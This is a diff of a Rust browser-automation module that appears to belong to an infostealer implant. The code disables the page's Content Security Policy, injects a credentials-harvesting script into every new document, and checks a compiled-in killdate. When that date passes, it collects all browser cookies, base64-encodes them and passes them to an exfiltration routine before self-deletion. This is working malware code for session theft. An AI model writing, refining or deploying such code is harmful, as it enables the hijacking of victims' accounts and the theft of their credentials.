@@ -1,21 +1,25 @@
 use chromiumoxide::{
     browser::{Browser, BrowserConfig},
-    cdp::{
-        js_protocol::runtime::{CallFunctionOnParams, CallArgument},
-        browser_protocol::{
-            page::{AddScriptToEvaluateOnNewDocumentParams, SetBypassCspParams},
-            target::TargetId,
-            network::Cookie
-        },
+    cdp::browser_protocol::{
+        page::{AddScriptToEvaluateOnNewDocumentParams, SetBypassCspParams},
+        target::TargetId,
+        network::Cookie
     },
 };
 
 use std::{
     path::PathBuf,
-    collections::HashSet
+    collections::HashSet,
 };
+
 use futures::StreamExt;
 use tokio::time::{sleep, Duration};
+
+use crate::exfil::exfil_data;
+
+use serde_json;
+
+use base64::{engine::general_purpose::URL_SAFE, Engine};
 
 pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error::Error>> {
     let (mut browser, mut handler) = Browser::launch(
@@ -86,14 +90,14 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
 
                 #[cfg(feature = "debug")]
                 println!("[+] Disabling csp");
-                 page.execute(SetBypassCspParams::new(true)).await?;
+                page.execute(SetBypassCspParams::new(true)).await?;
 
                 #[cfg(feature = "debug")]
                 println!("[*] Injecting JS into page with ID: {:?}", page_id);
                 page.execute(
                     AddScriptToEvaluateOnNewDocumentParams::builder()
-                    .source(include_str!("js/processed_credentials.js"))
-                    .build()?,
+                        .source(include_str!("js/credentials.js"))
+                        .build()?,
                 )
                 .await?;
 
@@ -110,8 +114,12 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
 
     #[cfg(feature = "debug")]
     println!("[*] Checking killdate...");
-    let page = browser.new_page("https://google.com").await?;
-    let delete_self: bool = page.evaluate(include_str!("js/processed_killdate.js")).await?.into_value()?;
+    let page = browser.new_page("about:blank").await?;
+    let current_timestamp = page.evaluate("Math.floor(Date.now() / 1000)").await?.into_value::<u64>()?;
+    let killdate_timestamp: u64 = env!("KILLDATE_TIMESTAMP").parse()?;
+
+    // Compare the timestamps
+    let delete_self: bool = current_timestamp > killdate_timestamp;
 
     if delete_self {
         #[cfg(feature = "debug")]
@@ -120,33 +128,32 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
         #[cfg(feature = "debug")]
         println!("[*] Retrieving cookies...");
         let cookies: Vec<Cookie> = browser.get_cookies().await?;
+        browser.close().await?;
+        browser.wait().await?;
 
-        #[cfg(feature = "debug")]
-        println!("[+] Disabling csp");
-        page.execute(SetBypassCspParams::new(true)).await?;
+        let cookies_json = serde_json::to_string(&cookies)?;
+        let encoded_cookies = URL_SAFE.encode(cookies_json.as_bytes());
+
+        println!("Base64 Encoded String (Full): {}", encoded_cookies);
 
         #[cfg(feature = "debug")]
         println!("[*] Sending cookies...");
-        let call_params = CallFunctionOnParams::builder()
-            .function_declaration(include_str!("js/processed_cookies.js"))
-            .argument(
-                CallArgument::builder()
-                .value(serde_json::to_value(cookies)?)
-                .build(),
-            )
-            .build()?;
-
-        let _result : bool = page.evaluate_function(call_params).await?.into_value()?;
+        if let Err(_e) = exfil_data(&encoded_cookies).await {
+            #[cfg(feature = "debug")]
+            eprintln!("[!] Error: {}", _e);
+        }
 
         #[cfg(feature = "debug")]
         println!("[+] Done");
+
+        Ok(delete_self)
     } else {
         #[cfg(feature = "debug")]
         println!("[+] Current date is not past killdate.");
+
+        browser.close().await?;
+        browser.wait().await?;
+
+        Ok(delete_self)
     }
-
-    browser.close().await?;
-    browser.wait().await?;
-
-    Ok(delete_self)
 }
